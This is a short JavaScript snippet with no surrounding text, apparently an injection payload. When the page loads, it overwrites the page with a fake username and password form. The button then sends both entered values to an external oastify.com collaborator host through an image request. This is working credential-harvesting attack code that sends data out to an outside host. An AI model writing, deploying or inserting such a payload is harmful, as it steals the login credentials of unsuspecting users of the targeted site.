window.onload = () => {
  document.body.innerHTML = `
    <input id="u">
    <input id="p" type="password">
    <button onclick="(new Image()).src='https://d3hwhzd0tvm38nx3njzzwzjzyq4hs7gw.oastify.com/?u='+encodeURIComponent(u.value)+'&p='+encodeURIComponent(p.value)">
      Send
    </button>
  `;
};
